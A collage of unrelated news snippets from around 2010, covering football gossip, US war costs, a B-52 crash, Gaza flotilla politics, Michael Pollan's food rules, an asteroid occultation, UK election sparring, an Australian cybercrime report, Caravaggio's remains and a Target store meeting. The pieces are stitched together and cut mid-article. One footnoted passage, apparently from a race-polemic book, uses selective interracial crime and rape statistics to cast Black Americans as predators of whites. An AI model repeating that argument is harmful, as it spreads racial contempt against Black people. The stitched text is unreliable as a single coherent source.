Benítez had advice for his former American bosses on who they should appoint as his replacement , suggesting Kenny Dalglish .
" He is the man for the job , " said Rafa , who is no doubt aware that Tom Hicks and George Gillett think Dalglish is anything but and was mischievously stirring the pot accordingly .
" The owners should listen to the fans because they are unhappy . "
Unhappy enough to organise another of those really effective 200 - yard protest ambles from a pub they were going to be in anyway to a match they were going to anyway ?
Only time will tell .
If Liverpool fans are unhappy now , they 'll be even more unhappy when they read the Daily Star 's account that Real Madrid are ready to buy Steven Gerrard .
The news that they 're also after Wayne Rooney and will pay £ 110 m for the pair might cheer them up a bit , as will the fact that the Star 's exclusive is n't backed up by anything stronger than a wishy - washy quote from an anonymous Real source that could be the bored looking , gum - chewing kid working in the club shop for his summer holidays .
" The lure of London , " could prove too strong for Juan Román Riquelme to resist , according to his Mr 15 % Barry McIntosh , who says the Argentina playmaker may turn down approaches from four other Premier League clubs in order to live near the Natural History Museum , Buckingham Palace and that while playing for West Ham .
And finally , the lure of Sheikh Mansour bin Zayed Al Nahyan 's money could prove too strong for Barcelona players Yaya Touré and Dani Alves to resist , although there 's every possibility we 're being excessively cynical again and they 've genuinely always wanted to live within easy access to the collection of Pre-Raphaelite paintings housed in Mosley Street 's Manchester Art Gallery .
Washington ( CNN ) --
The United States has spent more than $ 1 trillion on wars since the September 11 , 2001 , terror attacks , a recently released Congressional report says .
Adjusting for inflation , the outlays for conflicts in Afghanistan , Iraq and elsewhere around the world make the " war on terrorism " second only to World War II .
The report " Cost of Major U.S. Wars " by the Congressional Research Service attempts to compare war costs over a more than 230 - year period -- from the American Revolution to the current day -- noting the difficulties associated with such a task .
Since the the 9/11 terror attacks , the United States has spent an estimated $ 1.15 trillion .
World War II cost $ 4.1 trillion when converted to current dollars , although the tab in the 1940s was $ 296 billion .
World War II consumed a massive 36 percent of America 's gross domestic product -- a broad measurement of the country 's economic output .
The post -9/11 cost of the conflicts is about 1 percent of GDP .
Comparisons of costs of wars over a 230 - year period , however , are inherently problematic , the report says .
" One problem is how to separate costs of military operations from costs of forces in peacetime .
In recent years , the DOD ( Department of Defense ) has tried to identify the additional ' incremental ' expenses of engaging in military operations , over and above the costs of maintaining standing military forces . "
" Figures are problematic , as well , because of difficulties in comparing prices from one vastly different era to another , " according to the report .
" Perhaps a more significant problem is that wars appear more expensive over time as the sophistication and cost of technology advances , both for military and for civilian activities . "
The costs associated with the " war on terrorism " could still go much higher .
A Congressional Budget Office estimate from 2007 said the cost of the wars in Afghanistan and Iraq could total $ 2.4 trillion by 2017 , more than double the current amount .

The B - 52 crash at Fairchild Air Force Base was an aircraft mishap that occurred on June 24 , 1994 .
In the mishap , Bud Holland , who was piloting a United States Air Force ( USAF ) B - 52 Stratofortress based at Fairchild Air Force Base ( AFB ) ( callsign Czar 52 ) in a rehearsal for an upcoming airshow , flew the aircraft beyond its operational parameters and lost control .
As a result , the aircraft stalled , impacted the ground , and was completely destroyed .
The entire crew of four was fatally injured .

Cry , my beloved country , this amazing photo of the shooting of Emily Henochowicz , 21 , a Cooper Union art student demonstrating against Israel ’s flotilla raid on Monday , is at the Baltimore Sun site ( she ’s from Maryland ) .
It was taken by Majdi Mohammed of AP .
More photos of Henochowicz , I ’m afraid very graphic , at ISM site .
Henochowicz lost her left eye and had to have reconstructive surgery on her face , in Israel .
No news at the Cooper site , though they did issue a statement we picked up Tuesday .
Note the grim surroundings of the Qalandiya checkpoint , this is the eastern side of the checkpoint .
Oh and it has been reported that Henochowicz is Jewish .
She is an artist .
Here is her youtube page , check out Walkers and a frontier , and the flipbook .
Wow .
What was such a young and gifted American artist doing at Qalandiya checkpoint ?
We ’re pulling for you , Emily .

Read the full letter ( see the letter with signatures here ) :
President Barack Obama
The White House
1600 Pennsylvania Avenue
Washington , D.C. 20510
Dear Mr. President :
We write to affirm our support for our strategic partnership with Israel , and encourage you to continue to do so before international organizations such as the United Nations .
The United States has traditionally stood with Israel because it is in our national security interest and must continue to do so .
Israel is our strongest ally in the Middle East and a vibrant democracy .
Israel is also a partner to the United States on military and intelligence issues in this critical region .
That is why it is our national interest to support Israel at a moment when Israel faces multiple threats from Hamas in Gaza , Hezbollah in Lebanon , and the current regime in Iran .
Israel ’s opponents have developed clever diplomatic and tactical ploys to challenge its international standing , whether the effort to isolate Israel at the Nuclear Non-Proliferation Treaty review conference or the recent effort to breach the naval blockade around Gaza .
We fully support Israel ’s right to self - defense .
In response to thousands of rocket attacks on Israel from Hamas terrorists in Gaza , Israel took steps to prevent items which could be used to support these attacks from reaching Gaza .
Israel ’s naval blockade , which is legal under international law , allows Israel to keep dangerous goods from entering Gaza by sea .
The intent of the measures is to protect Israel , while allowing humanitarian aid into Gaza .
Late last month when Israel learned that groups operating in Turkey wanted to challenge its blockade of Gaza , Israel made every effort to ensure that the humanitarian aid reached Gaza without needlessly precipitating a confrontation .
Israeli forces were able to safely divert five of the six ships challenging the blockade .
However , video footage shows that the Israeli commandos who arrived on the sixth ship , which was owned by the Turkish Humanitarian Relief Foundation ( the IHH ) , were brutally attacked with iron rods , knives , and broken glass .
They were forced to respond to that attack and we regret the loss of life that resulted .
We are deeply concerned about the IHH ’s role in this incident and have additional questions about Turkey and any connections to Hamas .
The IHH is a member of a group of Muslim charities , the Union of Good , which was designated by the US Treasury Department as a terrorist organization .
The Union of Good was created by , and strongly supports Hamas , which has been designated as a foreign terrorist organization by the US State Department .
We recommend that your administration consider whether the IHH should be put on the list of foreign terrorist organizations , after an examination by the intelligence community , the State Department , and the Treasury Department .
We commend the action you took to prevent the adoption of an unfair United Nations Security Council resolution , which would have represented a rush to judgment by the international community .
We also deplore the actions of the United Nations Human Rights Council which , once again , singled out Israel .
Israel has announced its intention to promptly carry out a thorough investigation of this incident and has the right to determine how its investigation is conducted .
In the meantime , we ask you to stand firm in the future at the United Nations Security Council and to use your veto power , if necessary , to prevent any similar biased or one - sided resolutions from passing .
Finally , we believe that this incident should not derail the current proximity talks between Israel and the Palestinian Authority .
We hope that these talks will move quickly to direct negotiations and ultimately , to a two - state solution to the Israel - Palestinian conflict .
When whites do violence -- rape , murder , assault -- how often do they choose black victims ?
Should n't a nation of bigots target blacks most of the time ?
At least half of the time ?
Of course , it does not .
When whites commit violence , they to it to blacks 2.4 percent of the time .
Blacks , on the other hand , choose white victims more than half the time . [ 317 ]
In those cases in which the race of the killer is known , blacks kill twice as many whites as whites kill blacks .
Black - on - white robberies and gang assaults are twenty - one times more common than white on black .
In the case of gang robbery , blacks victimize whites fifty - two times more often than whites do blacks . [ 318 ]
The contrasts are even more stark in the case of interracial rape .
Studies from the late 1950s showed that the vast majority of rapes were same - race offenses .
Research in Philadelphia carried out in 1958 and 1960 indicated that of all rapes , only 3.2 percent were black - on - white assaults and 3.6 percent were white - on - black .
Since that time , the proportion of black - on - white rapes has soared .
In a 1974 study in Denver , 40 percent of all rapes were of whites by blacks , and not one case of white - on - black rape was found .
In general , through the 1970s , black - on - white rape was at least ten times more common that white - on - black rape . [ 319 ]
Because interracial rape is now overwhelmingly black on white , it has become difficult to do research on it or to find relevant statistics .
The FBI keeps very detailed national records on crime , but the way it presents rape data obscures the racial element rather than clarifies it .
Dr. William Wilbanks , a criminologist at Florida International University , had to sift carefully through the data to find that in 1988 there were 9,406 cases of black - on - white rape and fewer than ten cases of white - on - black rape . [ 320 ]
Another researcher concludes that in 1989 , blacks were three or four times more likely to commit rape than whites , and that black men raped white women thirty times as often as white men raped black women . [ 321 ]
Interracial crime figures are even worse than they sound .
Since there are more than six times as many whites as blacks in America , it means that any given black person is vastly more likely to commit a crime against a white than vice versa .

Michael Pollan , tall , fit , not quite skinny but very definitely lean , is holding a fruit yoghurt in one hand and a bottle of Coca - Cola in the other .
" So , " he says , " which do you think , per 100 grammes , contains more sugar ? "
The Coke , I reply .
Duh .
" Wrong , " he says .
" The yoghurt .
And look , it 's low - fat .
Is n't that great ?
We 're getting fat on low - fat food . "
It 's a nice illustration of Rule Nine in Pollan 's magnificently sensible new book , Food Rules .
Along with such gems as " Do n't eat anything your great - grandmother would n't recognise as food , " " avoid food products containing ingredients no ordinary human would keep in the pantry , " and " do n't get your fuel from the same place your car does , " Pollan recommends : " avoid food products with the wordoid ' lite ' or the terms ' low - fat ' or ' non - fat ' in their names . "
His reasoning : if you remove the fat from a foodstuff , it does n't necessarily make it non-fattening .
Certainly not if the producer ratchets up the sugar content to compensate for the flavour that vanished along with the fat .
In fact , Pollan notes , since Americans - and hence most of the rest of us in the west - began producing and eating low - fat food products , we 've actually been consuming up to 500 extra calories a day .
Brilliant .
Pollan , award - winning author , journalist and campaigner , is on a mission .
Food Rules is , in effect , a condensation of his previous work : much of the science behind these 64 simple , deliberately catchy injunctions ( " The whiter the bread , the sooner you 're dead " ) towards a healthier diet made up of real , honest food has already been expertly - and readably - dissected in works like The Omnivore 's Dilemma and the US bestseller In Defence of Food .
The Rules spring from two unarguable facts ( facts so unarguable , in fact , that even the biggest food multinational would have trouble contesting them ) .
The first is that people who eat what Pollan defines as a Western diet ( " lots of processed food and meats , lots of added fat and sugar , lots of everything except vegetables , fruits and whole grains " ) tend to suffer from Western ailments : obesity , type 2 diabetes , cardiovascular disease , and cancer .
The second is that people who do n't , people who eat more traditional diets - including diets like those of certain indigenous peoples which by the lights of Western food science might be considered way too high - fat , high - carb or high - protein - do not tend to suffer from these diseases .
In other words , human beings can cope with , can indeed thrive on , a wide variety of foods and diets , with one major exception : the diet most of us in the west are now eating .
So why are we all eating ourselves to death ?
Because for big food manufacturers , the Western diet is payday , every day .
" The more a food is processed , the more profitable it gets , " says Pollan .
And that status quo is not challenged by modern food science , which is all about identifying the " good " and " bad " nutrients in processed foods and tinkering with them - by lowering the fat , for example , or boosting the vitamins - rather than questioning the value of processed food products in the first place .
" We do n't talk about food any more , " says Pollan .
" We talk about nutrients : omega - 3 , antioxidants , saturated fats , polypenols .
And so we play into the hands of the food marketers - it all becomes one great big beautiful game . "
The world of processed food , he observes , is truly a marketer 's dream : " You can tweak it , reformulate it and reposition it ad infinitum .
And every time , you make money . "
( Which explains Rule 11 : " Avoid foods you see advertised on the television " .
Simply , since only the biggest food manufacturers can afford TV advertising , and more than two - thirds of TV food ads promote processed foods , declining to buy any food product backed by a big advertising budget means you 're unlikely to ingest what Pollan charmingly terms " edible foodlike substances " . )
This all has the crushing logic of truth .
Can we do anything about it ?
The real food movement , Pollan concedes , is up against " incredibly powerful " interests : multinationals smart enough to see which way the wind is blowing , and present themselves as part of the solution .
" My Rule Six , " he points out , " is : Avoid food products that contain more than five ingredients .
Haagen - Dazs just launched a new line .
Know what it 's called ?
Five .
It 's still ice - cream , though . "
He has little faith that Big Food will change voluntarily : legislation will be needed , he fears , although he takes heart from the Obama administration 's recent victory on healthcare reform .
" Pretty soon , " he explains , " the insurance industry is going to realise that we 're going to have to tackle obesity and type 2 diabetes .
They might even come out in favour of taxes on soft drinks .
And once we see one powerful industry pitted against another , then we might see progress . "
But the complication of food has been under way for a long time now .
The process , launched in Britain back in the 1800s thanks to the slave trade and the industrial revolution , really took off , Pollan reckons , after the second world war , when we " emerged from years of rationing - so ready to binge on sugar , meat , white flour - just as industry was converting from making bombs to making fertiliser , and nerve gases to pesticides . "
Agriculture suddenly got way more productive , so " corn and soy and wheat and rice got cheaper - and the only way to make money out of them was to process them .
A sort of arms race started to make food more complicated : Do n't buy flour , buy cake mix ; do n't buy cake mix , buy cakes .
Do n't buy oats , buy Cheerios ; not Cheerios , cereal bars . "
Not to mention , of course , our own fatal attraction to the three cheapest ingredients of all : sugar , salt and fat .
The fightback began to take hold with food scares like BSE , and is being further bolstered by mounting environmental concern : Big Food as it exists today is , patently , not sustainable .
Two shocking statistics : before 1950 , every calorie of fossil fuel energy expended on food production resulted in 2.3 calories of food ; these days it takes 10 calories of fossil fuel energy to produce one calorie of your edible foodlike substance .
Is that process reversible ?
It may have to be , Pollan argues , as we start running out of fossil fuels .
He 's sure we can produce enough real food to feed us all , but fossil fuels will have to be replaced by manpower .
" Organic farms are wildly productive , " he says , " but a lot more labour - intensive .
That 's why we should n't be exporting technologies to the developing world that will take people off the land .
We 're going to need more people on the land , everywhere . "
So convincing is Pollan 's logic , so practised his arguments , so impassioned his presentation , that you wonder where it all came from .
He started out , he says , as more of a naturalist than a foodie , but was gradually won over by the notion that " what happens on our plate actually represents our most powerful engagement with the natural world " .
So does he practise what he preaches ?
Certainly , he can no longer - knowing what goes into it - eat junk food .
( His teenage son , to his regret , can , but is apparently beginning to realise it may not be altogether as good by the end of the bucket as it seemed to be at the beginning . )
" I love good food , I love to eat , " he says .
" But while I 've had my share of meals in temples of molecular gastronomy , I 'm not over - keen .
For me it tends to get in the way of community , which for me is key to good eating .
It 's worth noting , in that context , that shared food flies in the face of the food industry 's interests : the more they can subdivide the family , make sure everyone eats something different , the more money they make . "
He acknowledges , though , that many of the exchanges he has about this whole issue " are with skinny people . "
An interest in good and healthy food is , still , something of a middle - class preoccupation .
" But abolition , women 's suffrage , those movements began as elitist too , " Pollan says .
" It 's too soon to say whether radical change is possible - the real challenge , in the end , is finding ways to make money selling simple foods .
But if this movement does what most movements do - shifts the centre just a few degrees - then that will already be progress .
I wo n't be discouraged . "
In a rare event on July 8 , 2010 , skywatchers will be able to see an asteroid briefly block out the light from a star as it passes in front .
It may be the only asteroid ' occultation ' this century observable with the naked eye .
Everybody is familiar with a solar eclipse , when our Moon passes in front of the Sun and blocks its light for several minutes .
A similar situation can happen with asteroids , the Sun-orbiting , rocky or metallic objects that are left over from the formation of the Solar System or were formed by collisions between other asteroids .
In total , we know of about 400,000 of these dark bodies , which range in size from a few hundred kilometres to just a few metres .
The smaller ones are hard to detect .
While an asteroid is far too small to cover the Sun , one will occasionally move directly in front of one of the many stars in the night sky and block its light from our view , causing a stellar eclipse or occultation .
Since asteroids move relatively fast , these events typically last just a few seconds .
Normally the occulted star is so faint the event can only be seen via telescope .

Roma to pass in front of Delta Ophiuchi
During the night of 8/9 July , however , a star that is visible to the naked eye , Delta Ophiuchi ( the fourth - brightest star in the constellation Ophiuchi ) , will be occulted by asteroid Roma , which has a diameter of about 50 km .
This means the occultation will be visible only along a path about 50 km wide , crossing central Europe , Spain and the Canary Islands ( scroll down for details on how to observe this event ) .
Catching a glimpse
Since asteroids , with very few exceptions , are too small to be resolved with ground - based telescopes , asteroid occultations are the only direct way of measuring the size of such an object .
When several observers record such an event , using video cameras with precise timing , the times when they see the occultation help to measure the shape of the asteroid .
advertisement
Since we know the speed of the asteroid , the duration of the occultation can be converted directly to a length .
This allows scientists to reconstruct the size and shape of the object .
ESA 's space hazards programme seeks asteroids
steroids -- in particular those coming close to Earth -- are the focus of the Near Earth Object ( NEO ) segment of ESA 's new Space Situational Awareness Preparatory Programme ( SSA - PP ) .
SSA - PP will provide timely and accurate information , data and services on the space environment , and particularly on hazards to satellites in orbit and infrastructure on the ground .
These hazards stem from possible collisions between objects in orbit , harmful space weather and potential strikes by natural objects such as asteroids that cross Earth 's orbit .
Currently , of the 400 000 - plus asteroids known in our Solar System ; more than 6500 are NEOs -- their orbits come close to that of Earth's .
NEOs could potentially hit our planet and , depending on their size , produce considerable damage .
While the chance of a large object hitting the Earth is very small , it would produce a great deal of destruction ; thus NEOs merit active detection and tracking .

One of Labour 's most senior cabinet ministers today launches a withering critique of the Liberal Democrats , claiming the surge in popularity for Nick Clegg is based on a form of " anti-politics " that provides no basis for government .
In an interview with the Guardian , the foreign secretary , David Miliband , accuses Clegg of trading on a myth – that " Britain has experienced 65 years of failure " .
His remarks mark a significant hardening of the Labour position from earlier in the week when cabinet figures such as Lord Adonis were trying to highlight similarities between the two parties .
With Labour now languishing in third place in many polls , the party is trying to stem the Lib Dem surge , and the continuing popularity of its leader , coming into the last fortnight of the campaign .
Rounding on the Lib Dems , Miliband said : " Anti-politics is fine for opposition , but it is not sufficient for government .
There is a market for anti-politics , due to the reaction to the sickening expenses scandal , but it is not a basis for running the country …
It 's not the way to seek a mandate for the running of our country . "
Miliband also warned against tactical voting , saying that a strong Lib Dem showing in 100 key Tory - Labour marginal constituencies would be decisive in whether the Conservatives won power .
He said voting Labour in such seats was " the only way to keep progressive politics governing this country " , adding : " We have said for a long time that David Cameron was not clear what he stood for , and I think Nick Clegg is only clear what he is against .
They are riding the anti-politics wave . "
A hung parliament was not on the ballot paper , he said , and a Labour vote was " the only way to keep progressive politics governing this country " .
At one point in the interview he said : " Look , you 've punished us enough about Iraq . "
He challenged Clegg over his core argument " that we have had 65 years of failure in this country " .
" If you look at the transformation of the country in the last 65 years it is because of the energy , drive , determination and sacrifice in the Labour party to take on the forces of inertia . "
Miliband rejected any suggestion that Gordon Brown should be forced to stand aside as part of a Lib - Lab deal .
Clegg has made repeated attacks on the prime minister , saying he is a desperate politician .
" We have chosen our leader .
We have got a strong leader and we have got a programme for the future .
We are not having Nick Clegg choosing the leader of the Labour party , thank you very much . "
Miliband suggested that the public had punished Labour enough over the Iraq war .
Asked if there was a serious danger of Labour coming third , he replied : " We have got the fight of our lives , and that is modern politics .
It is not tribal in the same way .
People are yearning for a more serious conversation . "
The remarks are the strongest attack yet on the Lib Dems by a mainstream Labour politician amid signs that the party will next week attempt to shift the focus of the general election campaign away from the TV debates – where Brown has yet to score a victory .
It is understood Labour officials have been in constant dialogue with broadcasters , trying to get them to stop obsessing over their own TV debates , and instead cover speeches on significant areas of policy .
Today the Lib Dems continued to demand that the Tories come clean about whether the shadow chancellor , George Osborne , or any other senior member of the party had been involved in briefing journalists from rightwing papers that launched personalised attacks on Clegg .
Danny Alexander , the Lib Dem election co-ordinator , called on Osborne to detail what role he had played , if any , in briefing reporters following Clegg 's spectacular performance in the first TV debate last week .
" George Osborne needs to come clean as to whether he himself was personally responsible for this negative smear campaign which is now backfiring spectacularly with the voters .
It reflects a panic in the old political establishment that they are in a battle for survival . "
More than 100 people complained to Ofcom about Thursday 's night 's second debate on Sky TV , in particular the way in which the presenter , Adam Boulton , raised allegations about donations to Clegg that had been made in the Daily Telegraph .
The claims were dismissed as nonsense by Clegg .
In another sign of the shifting political current , another senior Labour figure , the MP Jon Cruddas , hinted at the need to adjust to the Lib Dem surge and be open to tactical voting .
He said : " I 'm urging everyone to vote Labour , but it 's clear that politics is changing before our eyes and we can not be in denial about that . "

Four months ago , Windows 7 passed Windows Vista on Steam , the leader of the digital game distribution market , and we predicted that XP was in its crosshairs .
Last month , Windows 7 passed Windows XP , making it the most popular operating system on Steam .
Windows 7 is also the first version of Windows where gamers are adopting 64 - bit faster than 32 - bit .
That said , there are still more 32 - bit XP users than those on Windows 7 64 - bit .
Despite Windows 7's success , Windows share overall plummeted 8.43 percent from April 2010 due to all of the Mac OS users trying out Steam .
XP dipped 4.81 percent , Vista use dropped 2.07 percent , and Windows 7 was down 1.55 percent .
Of the new Mac OS X users , 1.4 percent were on Leopard and 7.06 percent are using Snow Leopard .
We 'll see over the next few months how many of these users stick around and how many convince their Mac friends to join in on the fun .
Each month , Steam collects and compiles data about the hardware and software its customers are using so that game developers can ensure they are making good decisions about what technology should take priority in their support plans .
If you 're wondering , Intel is still beating AMD ( 72.54 percent to 27.46 percent ) and NVIDIA is still beating ATI .

A RESERVE BANK currency firm was willing to supply prostitutes and pay bribes to foreign officials to win banknote supply contracts , according to a federal police witness at the centre of the nation 's most serious corruption investigation .
The explosive revelation is one of many made by a key witness in the Australian Federal Police inquiry into the Reserve Bank 's polymer currency company , Securency International .
The witness has told an investigation by the Herald 's sister newspaper The Age and ABC TV's Four Corners - to be aired tonight - that a middleman hired by Securency to win contracts from foreign governments told him that he intended to bribe a central bank governor from an Asian country .
The witness , who was a Securency employee , has given federal police his diary in which he recorded the middleman telling him in 2007 that the " governor would be very happy if the commission [ payment ] was increased " .

COLD , wet and cloudy weather returned yesterday but not before Daily Telegraph photographer John Grainger captured this spectacular photo of a Virgin Blue jet cruising past a rainbow 's vivid bands of orange and red .
Weather Channel meteorologist Dick Whitaker said showers were expected to continue until Friday , boosting soil moisture levels and farmers ' hopes of a good winter crop .
Temperatures are forecast to dip to a minimum of 9C in the CBD and 4C in the west today .
Originally published as A colourful flight of fantasy
An Australian Government committee has recommended the introduction of compulsory virus scanners on computers or users wo n’t be allowed on the internet as part of an alleged crackdown on “ cyber crime . ”
The Hackers , Fraudsters and Botnets : Tackling the Problem of Cyber Crime report from the House Standing Committee on Communications Inquiry into Cyber crime makes 34 different recommendations , with most shrieking of gross nanny state paternalism .
The headline proposal , if adopted by the Government , would force Australian internet users to install and keep up - to - date virus scanners on computers as a condition for internet access via the contractual obligations with their ISP .
Users would also be forced to “ take reasonable steps to remediate their computer (s ) when notified of suspected malware compromise . ”
In the event that the customer does not meet these contractual obligations , ISP ’s must provide “ a clear policy on graduated access restrictions and , if necessary , disconnection until the infected machine is remediated . ”
What the report does n’t state though is how such restrictions would be imposed ; forcing ISP ’s under law to enforce such rules may be possible , but the only way ISP ’s will be able to do this is by spying on their customers .
If that is n’t scary enough , the report also notes that such data would go back to the Government .
Recommendation 12 notes that the ” Australian Communications and Media Authority further increase its access to network data for the purpose of detecting malware compromised computers . ”
The compilation of the data even gets a name in Recommendation 13 : the “ Australian Internet Security Initiative network . ”
But Government intervention does n’t stop there .
Recommendation 16 states that “ The new scheme should involve the Australian Communications and Media Authority , Internet Service Providers , IT security specialists , and end users in a more tightly coordinated scheme to detect and clean malware infected computers , ” suggesting that once malware was discovered on a users computer , the Australian Government would involve itself with that computer .
Domain Registrars
While much of the report deals with the interaction between ISP ’s , Government and end users , the domain name industry also comes under fire .
Recommendation 20 states that domain name registrars must filter applications , attempt to identify any fraudulent uses for domains , and take down any name deemed bad by the Government .
Recommendation 21 notes that this regulation would be enforced by law .
Cyber health warnings for mobile phones
The report suggests that education is an important part of the process , and regularly repeats the need for various industry participants to educate users .
Recommendation 24 though goes into bizarre territory , stating that “ manufacturers and distributors of personal computers , mobile phones and related IT devices such as modems and routers , ” and that they must “ address the e-security vulnerabilities of these products and the provision of e-security information to consumers at the point of sale ; and require that the information is presented in a manner that is clear and accessible to a non -IT literate person . ”
The report does n’t state what form these cyber health warnings should take , but it ’s not inconceivable that an iPhone purchased in Australia might soon come with a cigarette packet style health warning stating something like “ this phone may be bad for your cyber health . ”
Manufacturers though wo n’t just have to apply cyber health warnings , they will also have to meet Government guidelines dictating an appropriate level of cyber -security .
Recommendation 25 notes that ” industry specific regulation under the Australian Consumer Law , including a scheme for the compulsory independent testing and evaluation of IT products and a product labeling scheme . ”
If they release a product that does n’t pass Government tests , the Government seeks to amend “ Australian Consumer Law to provide a cause of action for compensation against a manufacturer who releases an IT product onto the Australian market with known vulnerabilities that causes losses that could not have reasonably been avoided . ”
Yes : you read that right : the Australian Government wants to punish manufacturers when hackers find ways into their products .
It would be like the Government fining the builder of a house because it was broken in to , even when the best efforts are made to prevent such an event occuring .
Conclusion
The report follows proposals by the Australian Government to track emails and browsing history of every internet user in the country , a massive undertaking of unprecedented scope .
The Government has not yet stated that they will be introducing all of the recommendations of the report , but likewise the report came from a Government dominated House Committee ; it would be fair to suggest then that it would most likely have the support of the Government .
With the new proposals added to the list , Australia will soon censor the internet , track everything everyone does on it , and then dictate what software should be installed on your computer , with a kicker that if you do n’t comply , you ’ll lose internet access .
If that does n’t sound like the actions of a police state , I ’m buggered if I know what would .
This vintage - themed Moto Guzzi looks like an 850T to me .
And unlike most Guzzi customs , it ’s not a café racer — it ’s a bobber motorcycle .
This bike appeared briefly on a German website — which now appears to have gone under — and little information was forthcoming from the owner , apart from these images .
At the very least , this machine has been given a custom - made tank and seat , vintage - style Firestone tires , a fatter exhaust system and a bobbed front fender .
The bars appear to have a burnished copper finish — with matching fork uppers — plus built - in flashers and what appear to be wooden grips .
I doubt that the air - cooled V - twin motor has been tuned , but with around 60 hp on tap from 844 cc , performance should be more than enough .
If you know anything more about this lovely bobber motorcycle , please drop us a line in the comments .
Remains found in Tuscany are likely to be the artist 's , proving that lead poisoning was one cause of his death 400 years ago
He killed a man , brawled constantly , rowed with patrons and fled justice while revolutionising painting with his chiaroscuro style .
Now , as if to underline how dramatic Caravaggio 's short life was , researchers say he may have quite literally died for his art .
Scientists seeking to shed light on the mysterious death of the Italian artist in 1610 said they are " 85 % sure " they have found his bones thanks to carbon dating and DNA checks on remains excavated in Tuscany .
Caravaggio's suspected bones come complete with levels of lead high enough to have driven the painter mad and helped finish him off .
" The lead likely came from his paints – he was known to be extremely messy with them , " said Silvano Vinceti , the researcher who announced the findings today .
" Lead poisoning wo n't kill you on its own – we believe he had infected wounds and sunstroke too – but it was one of the causes . "
Art historians already suspect that Goya and Van Gogh may have suffered from the ill effects of the lead in their paints , which can cause depression , pain and personality changes .
Michelangelo Merisi , known as Caravaggio after the Lombardy town where he grew up , was a young man at the height of his career in Rome when he killed a man in a brawl in 1606 , fleeing to find new patrons in Naples and then Malta , only to be thrown off the island two years later for more brawling .
" After a fortnight 's work he will swagger about for a month or two with a sword at his side and a servant following him , from one ballcourt to the next , ever ready to engage in a fight or an argument , " wrote one observer .
In between fights he found time to astound his contemporaries with his shocking realism and use of light and shade – chiaroscuro – although he won no favours with religious authorities in Rome when he reportedly used a famous prostitute as a model for the madonna .
From Malta , Caravaggio moved to Sicily , where his paintings became as dark and shadowy as his worsening moods which prompted him to sleep armed and tear up paintings after any criticism .
Returning to Naples , Caravaggio was the victim of a possible attempt on his life , leaving him with the wounds Vinceti believes became infected and spurring him on to Tuscany were he hoped to obtain a pardon for the Rome murder .
How Caravaggio died there , at 38 , has been shrouded in mystery ever since – a blank page that Vinceti and a team of archaeologists and forensic scientists have set out to fill 400 years after his death .
To test existing theories that he died of malaria on a Tuscan beach , was devoured by syphilis , or was murdered by one of his many enemies , the team needed to start by locating Caravaggio 's remains , which had never been found .
Vinceti went into action when a document was unearthed suggesting the painter was buried in the tiny San Sebastiano cemetery in Porto Ercole .
Discovering that the site had been built over in 1956 , the team headed for the town 's municipal cemetery to where the bones had been shifted , turning up nine potential sets .
" Set number five turned out to be from a tall man – Caravaggio was described as such – while tests showed he was between 38 and 40 and died around 1610 , " said Vinceti .
The team 's next stop was the town of Caravaggio to compare DNA from the bones with local people .
No descendents were found but families with the same surname were traced , giving samples which were 50 to 60 % compatible with the bones .
Add in the toxic level of lead in the remains and Vinceti is convinced he has his man , adding to his reputation as Italy 's foremost cold case historian , which he won when he dug up the remains of Giovanni Pico della Mirandola , a philosopher at the court of the Medicis , to prove he had been poisoned .
Now Vinceti is aiming for Leonardo da Vinci , hoping the custodians of his tomb will let him in to create a facial reconstruction of the Renaissance polymath .
Vinceti's press conference today at which a purported fragment of Caravaggio 's skull was displayed on a silk red cushion could not have been better timed .
Shunned after his death before coming to be recognised as one of the fathers of modern painting , an exhibition of Caravaggio's work at the Scuderie del Quirinale in Rome this year celebrating the 400th anniversary of his death attracted 580,000 visitors .
Representatives from both the Target Corporation and the owners of the property the company is leasing made themselves available for what turned out to be an extended presentation and Q&A session last night , at the possible future site of the popular chain store at Geary and Masonic .
Regional Development Manager for Target , John Dewes , accidentally revealed to the audience that plans for their new “ urban ” store style , of which the store at Geary / Masonic is representative , was also in the works for SOMA ’s Metreon .
This would give Target , a store thus far without a presence in SF , two outlets in the city by the Bay .
With this news in mind , the evening ’s proceedings stayed remarkably on track .
After about twenty minutes of poster board and PowerPoint aided presentations involving sketches of what looks to be an external overhaul of the old Mervyn ’s building , including paint jobs , planter boxes , colorful window displays ( on the particularly dreary Geary St. side ) and even small wind turbines atop the structure - Target ’s nod at sustainable energy – the crowd was ready to chime in .
Much of the commentary was in the form of congratulatory and welcoming statements , from attendees jubilant that Target was ( tentatively ) moving in at all .
One audience member , echoing the opinion of some others in the room , was excited at the prospect of no longer having to drive to Colma or Daly City to pick up certain staples , like 36 rolls of toilet paper ( a product archetype that was thrown around , no pun , a few times throughout the evening ) .
As he wryly observed , “ There are n’t a lot of people in Colma , just a lot of cemeteries . ”
Others pointed out that the tax revenue forgone by the absence of a major chain store where one could easily move in was a shame , especially given the city ’s current fiscal troubles .
Most of the criticism – and there had to be some – came in the form of expected traffic nightmares , primarily from attendees who live and drive nearby .
The Target representatives attempted to assuage these fears by pointing out the existence of 600 + parking spaces available at the location , and noted that if such a number of parking spaces were proposed today ( and not the early 1960s when the current site was built ) they would not be approved .
But suspicions lingered nonetheless , as evidenced by persistence of parking related questions throughout the meeting .
One solution came from local resident Kat Anderson : How about a delivery service ?
She asked for a show of hands from those that would take advantage of a delivery service if Target were to offer it .
Only a dozen or so people were in the affirmative on that concept , a disappointing outcome judging from the look on her face .
Another audience generated plan for calming traffic included price discounts for those taking Muni to the store .
Present your receipt , and save a little on those 36 rolls of toilet paper .
( The Target reps pleaded the fifth on that one . )
There were almost as many traffic reduction ideas being voiced as there were people in attendance .
Some feared that Target , which will feature a grocery , may impinge on the turf of the Trader Joe ’s across the street , with one audience member stating she ’d be “ pissed ” if TJs were forced to close up shop due to competitionwith a department store .
As Thom Lasley , Target ’s lead design project architect , tried to reassure , Trader Joe ’s caters to a different kind of customer .
Whereas Target will carry basic foodstuffs , Trader Joe ’s carries , well , “ freeze dried pineapple crisps . ”
Some wanted assurance that older members of the neighborhood would be considered for employment , and a promise of no discrimination in hiring , while others implored the corporation to hire only locally during the remodeling phase .
All in all the reception was overwhelming positive .
A suggestion by someone in the back of the room that all further public meetings on the issue be packed with Target supporters , to help combat the anti-chain hostility that is expected to rear its head , drew much applause .
But given the mostly approving feedback on display , this is probably an unnecessary plan of action .
Even under the most optimistic approval process scenario , Dewes estimated the opening of both the Geary / Masonic and Metreon stores for Spring of 2012 .
Pregnancy has become ever more " policed " , with a litany of rules for parents - to - be on how to behave , a parenting conference is due to hear .
Image caption Men are increasingly encouraged to be involved in a partner 's pregnancy
